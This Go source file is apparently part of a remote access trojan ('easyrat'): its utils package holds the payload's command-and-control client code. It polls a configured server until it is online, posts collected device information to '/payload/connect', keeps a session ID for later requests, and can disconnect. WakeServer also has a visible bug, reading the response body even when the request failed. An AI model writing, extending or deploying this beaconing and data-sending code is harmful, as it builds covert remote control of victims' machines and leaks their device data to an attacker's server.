package utils

import (
	"bytes"
	"easyrat/payload/modules"
	"easyrat/utils/types"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"time"
)

var Connected bool = false
var ID string = ""

func GetUrl() string {
	return fmt.Sprintf("http%s://%s:%d", func() string {
		if Https {
			return "s"
		} else {
			return ""
		}
	}(), Ip, Port)
}

func Get(path string) (*http.Response, error) {
	req, err := http.NewRequest("GET", GetUrl()+path, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Session-ID", ID)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func Post(path string, contentType string, data io.Reader) (*http.Response, error) {
	req, err := http.NewRequest("POST", GetUrl()+path, data)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", contentType+"; charset=utf-8")
	req.Header.Set("Session-ID", ID)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func PostForm(path string, data url.Values) (*http.Response, error) {
	resp, err := http.PostForm(GetUrl()+path, data)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func PostJSON(path string, data interface{}) (*http.Response, error) {
	var buf bytes.Buffer
	err := json.NewEncoder(&buf).Encode(data)
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest("POST", GetUrl()+path, &buf)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	req.Header.Set("Session-ID", ID)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func WakeServer() {
	resp, err := Get("/status")
	if err != nil {
		fmt.Printf("Error waking server. %s\n", err.Error())
	}
	var server_status types.ServerStatusResp
	err = json.NewDecoder(resp.Body).Decode(&server_status)
	if err != nil {
		fmt.Printf("Error reading json. %s\n", err.Error())
	}
	if !server_status.Online {
		// Try again every 10 seconds
		fmt.Println("Server not online, trying again...")
		time.Sleep(10 * time.Second)
		WakeServer()
	}
}

// Connects to the server
func ConnectServer() error {
	WakeServer()
	resp, err := PostJSON("/payload/connect", modules.DeviceInfo())
	if err != nil {
		fmt.Printf("Error connecting to server. %s\n", err.Error())
		return err
	}
	var connection types.ConnectResp
	err = json.NewDecoder(resp.Body).Decode(&connection)
	if err != nil {
		panic("Error decoding json. " + err.Error())
	}
	ID = connection.SessionID
	return nil
}

// Send a disconnect message to the server
func DisconnectServer() error {
	_, err := Get("/payload/disconnect")
	if err != nil {
		return err
	}

	return nil
}
